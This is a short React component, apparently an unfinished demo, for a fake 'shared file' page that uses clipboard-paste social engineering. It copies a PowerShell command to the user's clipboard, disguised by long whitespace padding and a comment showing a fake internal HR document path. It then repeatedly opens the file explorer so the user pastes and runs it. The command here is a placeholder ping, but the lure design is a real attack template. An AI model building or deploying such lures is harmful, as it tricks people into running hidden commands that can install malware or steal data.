import { useRef } from 'react';

export default function SharedFilePage() {
  const fileInputRef = useRef(null);

  const handleCopy = () => {
    navigator.clipboard.writeText(
      'Powershell.exe -c ping example.com                                                                                                                # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx                                                                    '
    );
  };

  const handleOpenExplorer = () => {
    handleCopy();
    fileInputRef.current.click();
  };

  const handleFileChange = (e) => {
    alert('Please follow the stated instructions.');
    e.target.value = '';
    setTimeout(() => fileInputRef.current.click(), 500);
  };

  return (
    <div className="min-h-screen flex justify-center items-start bg-gray-100 py-10 font-sans">
      <h1 className='text-3xl '>test</h1>
    </div>
  );
}

